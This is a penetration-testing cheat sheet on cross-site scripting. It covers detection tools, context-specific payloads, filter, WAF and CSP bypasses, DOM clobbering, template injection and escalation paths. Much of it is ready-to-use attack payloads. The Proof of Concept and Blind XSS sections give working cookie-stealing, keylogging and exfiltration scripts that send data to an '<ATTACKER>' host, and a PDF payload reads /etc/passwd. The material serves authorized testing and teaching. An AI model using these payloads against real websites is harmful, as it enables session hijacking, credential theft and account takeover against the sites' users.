# XSS (Cross-Site Scripting)

> **Summary**: Injection of malicious scripts into web pages viewed by other users, via reflected, stored, or DOM-based vectors.
> **Impact**: Session hijacking, credential theft, defacement, malware distribution, full account takeover.
> **Typical Severity**: High | Critical (Stored/Blind) | Medium (Reflected/DOM)

---

## Detection

### Indicators
- User-controlled input reflected in HTML responses without encoding
- Parameters reflected inside `<script>` blocks, HTML attributes, or tag bodies
- JavaScript sinks consuming data from `location`, `document.cookie`, `document.referrer`, `window.name`
- Application accepts and stores HTML/JS in fields like profile bios, comments, file names

### Automated Detection
```bash
# Dalfox - parameter analysis and XSS scanning
# https://github.com/hahwul/dalfox
dalfox url http://example.com
cat urls | dalfox pipe - --skip-bav --skip-mining-all

# Gxss - find reflected parameters that could lead to XSS
# https://github.com/KathanP19/Gxss
cat list | Gxss -c 100 -p REPLACE_STRING
```

### Manual Detection
1. Inject a canary string (e.g., `xss123test`) into every parameter, path segment, header, and cookie
2. Search the response for the canary to identify reflection points
3. Determine the **context**: raw HTML, inside an attribute, inside `<script>`, inside a JS string, template literal
4. Test which characters are reflected unencoded: `< > " ' / \`` `( )`
5. Build a context-appropriate payload

### Semgrep for DOM XSS
Download and beautify JavaScript files, then scan for source-to-sink flows:
```bash
semgrep -c xss.yaml scripts/*
```

> JavaScript files must be beautified first, otherwise semgrep will not work properly.

**Pattern-based detection (sources and sinks):**

Common DOM sources: `document.URL`, `document.documentURI`, `document.baseURI`, `document.cookie`, `document.referrer`, `location.search`, `location.hash`, `location.pathname`, `location.href`, `window.name`, `localStorage`, `sessionStorage`

Common DOM sinks: `innerHTML`, `outerHTML`, `insertAdjacentHTML()`, `document.write()`, `document.writeln()`, `eval()`, `setTimeout()`, `setInterval()`, `Function()`, `script.src`, `iframe.src`, `location.href`, `location.assign()`, `location.replace()`, `$.html()`, `$.parseHTML()`

---

## Exploitation

### Prerequisites
- User-controlled input reflected or used in the page
- Insufficient input validation / output encoding
- For Stored XSS: ability to persist payload (comments, profiles, file uploads)
- For DOM XSS: JavaScript code that passes attacker-controlled source data to a dangerous sink

### XSS Types

| Type | Description | Persistence |
|------|-------------|-------------|
| Reflected | Payload in request is reflected in immediate response | None |
| Stored | Payload persisted server-side, served to other users | Persistent |
| DOM-based | Payload processed entirely client-side via JS sinks | Depends |
| Blind | Stored XSS that triggers in a different context (admin panel, logs) | Persistent |

### Step-by-Step

1. **Identify reflection points** - inject a unique string and search for it in the response
2. **Determine the context** - raw HTML, attribute value, JS string, template literal, URL
3. **Test character filtering** - which of `< > " ' \`` `/ ( ) ; { }` pass through unencoded
4. **Craft context-appropriate payload** - see Payloads section below
5. **Verify execution** - use `alert(document.domain)` or callback to Burp Collaborator / webhook
6. **Escalate** - cookie theft, keylogging, phishing, or chaining with CSRF

**Success criteria**: JavaScript execution in the context of the victim's browser session

### Payloads

#### Raw HTML Context
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src>">
```

#### Inside HTML Attribute
```html
" autofocus onfocus=alert(1) x="
" onmouseover=alert(1) x="
" accesskey="x" onclick="alert(1)" x="
"><img src=x onerror=alert(1)>
"><svg onload=alert(1)>
'onfocus='alert(1)' autofocus='
javascript:alert(1)    <!-- for href, src, action attributes -->
```

#### Inside JavaScript String
```javascript
'-alert(1)-'
';alert(1)//
\';alert(1)//
</script><script>alert(1)</script>
```

#### Inside Template Literals
```javascript
${alert(1)}
${constructor.constructor('alert(1)')()}
```

#### Inside JavaScript URL (href, src)
```
javascript:alert(1)
javascript://trusted.example.com/%0Aalert(1)   <!-- Safari -->
```

#### Event Handlers Without Parentheses
```html
<img src=x onerror=alert`1`>
<svg onload=alert&lpar;1&rpar;>
<img src=x onerror=location='javascript:alert(1)'>
```

### Proof of Concept
```html
<!-- Cookie stealing -->
<script>new Image().src="https://<ATTACKER>/steal?c="+document.cookie</script>

<!-- Keylogger -->
<script>document.onkeypress=function(e){new Image().src="https://<ATTACKER>/k?k="+e.key}</script>

<!-- Session hijacking via fetch -->
<script>
fetch("https://<ATTACKER>/exfil", {
  method: "POST",
  body: document.cookie
});
</script>
```

---

## Bypasses

### Case Variation
```html
<ScRiPt>alert(1);</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>
<object data="JaVaScRiPt:alert(1)">
```

### No Spaces
```html
<svg/onload=alert(1)>
<img/src=x/onerror=alert(1)>
```

### JavaScript Encoding
```
Unicode:       \u0061\u006c\u0065\u0072\u0074(1)
Octal:         \141\154\145\162\164(1)
Hex:           \x61\x6c\x65\x72\x74(1)
ES6 Unicode:   ale\u{72}t(1\x29)
Base64:        atob("YWxlcnQoMSk=")
```

### String Construction (No Direct Keywords)
```javascript
String.fromCharCode(97,108,101,114,116,40,49,41)
/alert(1)/.source
decodeURI(/alert(%22xss%22)/.source)
[].constructor.constructor("alert(1)")()
```

### Execution Sinks (Keyword-Free)
```javascript
eval("alert(1)")
setTimeout("alert(1)")
setInterval("alert(1)")
Function("alert(1)")()
[].constructor.constructor("alert(1)")()
```

### WAF Bypass - Akamai
```
"><a/\test="%26quot"href=%27javascript:/**/;\ale\u{72}t(11111\x29");%27>Click
```

### CSP Bypass

**Common CSP directives**: `script-src`, `style-src`, `img-src`, `object-src`, `connect-src`, `default-src`, `frame-ancestors`, `form-action`

**Techniques:**
- If Google domains are whitelisted:
  ```
  www.google.com/complete/search?client=chrome&q=1&jsonp=alert(1)//
  accounts.google.com/o/oauth2/revoke?callback=alert(1)
  ```
- JSONP endpoints on whitelisted CDNs
- `base-uri` not set: inject `<base href="https://<ATTACKER>/">` to hijack relative script loads
- `script-src 'unsafe-inline'`: direct XSS
- `script-src 'unsafe-eval'`: use `eval()`, `setTimeout()`, `Function()`
- Missing `object-src`: use `<object>` or `<embed>` with Flash/Java
- `script-src 'nonce-<VALUE>'`: find nonce reuse or injection point before nonce tag

See also: [CSP Evaluator](https://csp-evaluator.withgoogle.com/)

### Markdown Parsers
Markdown renderers can be vulnerable to XSS via nested parsers. Reference: [Fuzzing for XSS via Nested Parsers](https://swarm.ptsecurity.com/fuzzing-for-xss-via-nested-parsers-condition/)

---

## Advanced Techniques

### DOM Clobbering
Override JavaScript global variables via HTML `id`/`name` attributes:
```html
<a href="controlled-value" id="x"></a>
<!-- In JS: x.toString() returns "controlled-value" -->

<!-- Array clobbering -->
<a id="x"><a id="x" name="y" href="controlled"></a>
<!-- x[1] and x.y both return "controlled" -->

<!-- Deep clobbering via form -->
<form id="x" name="y"><input id="z" value="controlled"></form>
<!-- x.y.z.value returns "controlled" -->
```

### Mutation XSS (mXSS)
Exploits browser HTML parser mutations where sanitized HTML is re-parsed and becomes dangerous. Targets DOMPurify and similar sanitizers when they fail to account for parser quirks.

### Prototype Pollution to XSS
If prototype pollution exists, it may be chained to XSS by polluting properties consumed by frameworks or libraries:
```javascript
// Pollute Object.prototype to inject attributes
Object.prototype.innerHTML = '<img src=x onerror=alert(1)>'
```

### Client-Side Template Injection (CSTI)
**AngularJS:**
```
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
```
Angular class name injection:
```html
<div ng-app>
  <strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```

**Vue.js:**
```
{{_c.constructor('alert(1)')()}}
```

### Blind XSS
Payloads that fire in admin panels, log viewers, support tickets, or email clients:
```html
<script src=https://<ATTACKER>/blind.js></script>
"><img src=x onerror=this.src='https://<ATTACKER>/?c='+document.cookie>
```
Use platforms like [XSS Hunter](https://xsshunter.com/) or [bXSS](https://github.com/LewisArdern/bXSS).

### Server-Side XSS in Dynamic PDFs
When user input is rendered into PDFs via wkhtmltopdf, Puppeteer, or similar:
```html
<iframe src="file:///etc/passwd" width="1000" height="1000">
<script>document.write(window.location)</script>
```

---

## Escalation
- **Session hijacking**: steal cookies, tokens, or session identifiers
- **Account takeover**: change email/password via CSRF-like requests from XSS context
- **Keylogging**: capture credentials as they are typed
- **Phishing**: inject fake login forms into trusted domains
- **Worm propagation**: self-replicating stored XSS (e.g., Samy worm)
- **Chain with [CSRF](csrf.md)**: bypass CSRF tokens by extracting them via DOM access
- **Chain with [Clickjacking](clickjacking.md)**: overlay invisible frames
- **Pivot to internal network**: use XSS as a proxy to scan/attack internal hosts
- See also: [Cookie-Based Attacks](cookie-based-attacks.md), [Open Redirect](open-redirect.md)

---

## Tools

| Tool | Usage |
|------|-------|
| [Dalfox](https://github.com/hahwul/dalfox) | `dalfox url <URL>` - automated XSS scanner |
| [Gxss](https://github.com/KathanP19/Gxss) | `cat urls \| Gxss -c 100` - find reflected params |
| [XSStrike](https://github.com/s0md3v/XSStrike) | `python xsstrike.py -u <URL>` - intelligent XSS detection |
| [kxss](https://github.com/Emoe/kxss) | Reflected parameter finder |
| [DOMLoggerpp](https://github.com/kevin-mizu/domloggerpp) | Browser extension to trace DOM sources/sinks |
| [Semgrep](https://semgrep.dev/) | Static analysis for JS source-to-sink flows |
| [XSS Hunter](https://xsshunter.com/) | Blind XSS callback platform |
| [Burp Suite](https://portswigger.net/) | Active/passive XSS scanning |
| [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader) | Burp browser extension for DOM XSS |

---

## References

| URL | Description |
|-----|-------------|
| [PortSwigger XSS](https://portswigger.net/web-security/cross-site-scripting) | Comprehensive XSS learning resource |
| [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Scripting_Prevention_Cheat_Sheet.html) | Defense guidance |
| [HackTricks XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting) | Extensive XSS methodology |
| [PayloadsAllTheThings XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection) | Payload repository |
| [XSS Pwnfunction](https://xss.pwnfunction.com/) | Interactive XSS challenges |
| [Bypassing XSS Detection Mechanisms](https://github.com/s0md3v/MyPapers/tree/master/Bypassing-XSS-detection-mechanisms) | WAF bypass research |
| [HTML Parser Quirks](https://htmlparse.hackaplaneten.se/) | Parser differential testing |
| [Fuzzing for XSS via Nested Parsers](https://swarm.ptsecurity.com/fuzzing-for-xss-via-nested-parsers-condition/) | Markdown parser XSS |
| [DOMXSSWiki](https://github.com/wisec/domxsswiki/wiki) | Updated list of DOM sources and sinks |
